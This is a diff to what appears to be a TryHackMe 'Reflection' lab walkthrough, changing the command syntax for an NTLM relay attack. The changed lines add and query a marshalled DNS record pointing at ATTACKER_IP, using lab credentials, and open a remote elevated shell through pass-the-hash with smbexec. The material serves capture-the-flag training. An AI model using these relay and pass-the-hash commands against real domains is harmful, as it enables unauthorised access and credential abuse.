@@ -199,7 +199,7 @@ Check SMB signing and coercion status with NetExec:
 Add the marshalled DNS record pointing at the attacker:
 
 ```
- python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add \
+dnstool -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action add \
   --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
   --data ATTACKER_IP TARGET_IP
 ```
@@ -209,7 +209,7 @@ Add the marshalled DNS record pointing at the attacker:
 Verify the record exists:
 
 ```
- python3 dnstool.py -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action query \
+dnstool -u 'reflection.thm'\\'sawan' -p 'R3flect0r' --action query \
   --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
   --data ATTACKER_IP TARGET_IP
 
@@ -290,9 +290,7 @@ The output can include NTLM hashes for domain accounts  use these for lab questi
 Open a remote elevated shell using an extracted hash (example format):
 
 ```
- python3 /usr/share/doc/python3-impacket/examples/smbexec.py \
-  -hashes XXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXX \
-  -u svc TARGET_IP
+smbexec -hashes XXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXX -u svc TARGET_IP
 ```
 
 ![NTLM_Relay](TryHackMe_Reflection_Domain_cred.jpg)
